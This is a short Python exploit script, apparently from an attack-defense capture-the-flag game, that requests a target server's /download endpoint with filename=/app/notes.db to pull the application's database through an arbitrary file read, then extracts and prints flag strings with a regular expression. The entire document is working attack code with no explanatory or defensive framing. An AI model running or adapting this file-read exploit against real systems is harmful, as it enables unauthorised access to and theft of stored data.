#!/usr/bin/env python3

import requests
import sys
import re


def sploit(host):
    r = requests.get(f"http://{host}:5000/download?filename=/app/notes.db")
    flags = '\n'.join(re.findall("[0-9-A-Z]{31}=", r.text))
    print(flags, flush=True)


if __name__ == "__main__":
    sploit(sys.argv[1])
